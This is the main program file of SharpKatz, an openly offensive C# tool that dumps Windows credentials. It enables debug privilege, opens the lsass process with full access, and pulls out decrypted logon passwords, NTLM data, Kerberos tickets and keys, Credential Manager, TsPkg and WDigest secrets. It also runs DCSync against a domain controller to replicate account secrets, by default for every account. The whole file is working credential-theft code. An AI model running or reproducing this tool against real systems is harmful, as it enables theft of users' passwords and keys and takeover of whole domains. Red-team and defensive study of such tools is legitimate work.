//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using NDesk.Options;
using SharpKatz.Credential;
using SharpKatz.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;

namespace SharpKatz
{
    public class Program
    {
        public static void Main(string[] args)
        {

            string command = null;
            string user = null;
            string guid = null;
            string altservice = null;
            string domain = null;
            string dc = null;

            bool showhelp = false;

            OptionSet opts = new OptionSet()
            {
                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest", v => command = v },
                { "User=", "--User [user]", v => user = v },
                { "Guid=", "--Guid [guid]", v => guid = v },
                { "Domain=", "--Domain [domain]", v => domain = v },
                { "DomainController=", "--DomainController [domaincontroller]", v => dc = v },
                { "Altservice=", "--Altservice [domaincontroller]", v => altservice = v },
                { "h|?|help",  "Show available options", v => showhelp = v != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (showhelp)
            {
                opts.WriteOptionDescriptions(Console.Out);
                Console.WriteLine();
                Console.WriteLine("[*] Example: SharpKatz.exe --Command logonpasswords");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command ekeys");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command msv");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command kerberos");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command tspkg");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command credman");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command wdigest");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc");
                Console.WriteLine("[*] Example: SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc");
                return;
            }

            if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") && 
                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync"))
            {
                Console.WriteLine("Unknown command");
                return;
            }

            if (string.IsNullOrEmpty(command))
                command = "logonpasswords";

            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Windows 32bit not supported");
                return;
            }

            OSVersionHelper osHelper = new OSVersionHelper();
            osHelper.PrintOSVersion();

            if (osHelper.build <= 9600)
            {
                Console.WriteLine("Unsupported OS Version");
                return;
            }

            if (!command.Equals("dcsync"))
            {
                if (!Utility.IsElevated())
                {
                    Console.WriteLine("Run in High integrity context");
                    return;
                }

                Utility.SetDebugPrivilege();

                IntPtr lsasrv = IntPtr.Zero;
                IntPtr wdigest = IntPtr.Zero;
                IntPtr lsassmsv1 = IntPtr.Zero;
                IntPtr kerberos = IntPtr.Zero;
                IntPtr tspkg = IntPtr.Zero;
                IntPtr lsasslive = IntPtr.Zero;
                IntPtr hProcess = IntPtr.Zero;
                Process plsass = Process.GetProcessesByName("lsass")[0];

                ProcessModuleCollection processModules = plsass.Modules;
                int modulefound = 0;

                for (int i = 0; i < processModules.Count && modulefound < 5; i++)
                {
                    if (processModules[i].ModuleName.ToLower().Contains("lsasrv.dll"))
                    {
                        lsasrv = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    if (processModules[i].ModuleName.ToLower().Contains("wdigest.dll"))
                    {
                        wdigest = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    if (processModules[i].ModuleName.ToLower().Contains("msv1_0.dll"))
                    {
                        lsassmsv1 = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    if (processModules[i].ModuleName.ToLower().Contains("kerberos.dll"))
                    {
                        kerberos = processModules[i].BaseAddress;
                        modulefound++;
                    }
                    if (processModules[i].ModuleName.ToLower().Contains("tspkg.dll"))
                    {
                        tspkg = processModules[i].BaseAddress;
                        modulefound++;
                    }

                }

                hProcess = Natives.OpenProcess(Natives.ProcessAccessFlags.All, false, plsass.Id);

                List<Logon> logonlist = new List<Logon>();

                Keys keys = new Keys(hProcess, lsasrv, osHelper);

                Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                if (command.Equals("logonpasswords") || command.Equals("msv"))
                    Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                if (command.Equals("logonpasswords") || command.Equals("credman"))
                    Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                if (command.Equals("logonpasswords") || command.Equals("tspkg"))
                    Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
                {
                    List<byte[]> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("kerberos"))
                        foreach (byte[] p in klogonlist)
                            Module.Kerberos.GetCredentials(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("ekeys"))
                        foreach (byte[] p in klogonlist)
                            Module.Kerberos.GetKerberosKeys(ref hProcess, p, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
                }

                if (command.Equals("logonpasswords") || command.Equals("wdigest"))
                    Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                Utility.PrintLogonList(logonlist);
            }
            else
            {
                if (string.IsNullOrEmpty(domain))
                    domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
                Console.WriteLine("[!] {0} will be the domain", domain);
                if (string.IsNullOrEmpty(dc))
                {
                    DirectoryEntry rootdse = new DirectoryEntry("LDAP://RootDSE");
                    dc = (string)rootdse.Properties["dnshostname"].Value;
                }
                Console.WriteLine("[!] {0} will be the DC server", dc);
                string alt_service = "ldap";
                if(!string.IsNullOrEmpty(altservice) )
                    alt_service = altservice;

                
                if (!string.IsNullOrEmpty(guid))
                {
                    Console.WriteLine("[!] {0} will be the Guid",guid);
                    Module.DCSync.FinCredential(domain, dc,guid: guid, altservice: alt_service);
                }
                else if(!string.IsNullOrEmpty(user))
                {
                    Console.WriteLine("[!] {0} will be the user account",user);
                    Module.DCSync.FinCredential(domain, dc, user: user,altservice: alt_service);
                }
                else
                {
                    Module.DCSync.FinCredential(domain, dc, altservice: alt_service, alldata: true);
                }
                
            }
        }
    }
}
